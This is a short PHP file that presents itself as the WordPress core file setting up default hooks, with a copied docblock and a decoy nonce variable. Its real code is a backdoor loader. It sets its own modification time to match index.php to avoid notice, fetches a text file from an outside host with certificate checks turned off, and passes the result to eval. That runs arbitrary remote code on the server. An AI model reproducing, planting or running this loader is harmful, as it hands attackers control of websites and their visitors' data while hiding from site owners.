<?php 
/**
 * Sets up the default filters and actions for most
 * of the WordPress hooks.
 *
 * If you need to remove a default hook, this file will
 * give you the priority for which to use to remove the
 * hook.
 *
 * Not all of the default hooks are found in style.php
 *
 * @package WordPress
 * @id 83a6ee9b34553e9cf5ef0c507270c
 */

// Strip, trim, kses, special wp_nonces for string saves

$wp_nonce = "a9b53cbf8d87802b5394c33d4206fbde";
function get_contents($url){
  $ch = curl_init("$url");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
  $result = curl_exec($ch);
  return $result;
}
if(file_exists("index.php")) {
	touch(__FILE__, filemtime("index.php"));
}
$a = get_contents('http://br228.teste.website/~estan832/alalioer/wordpress.txt');
eval('?>'.$a);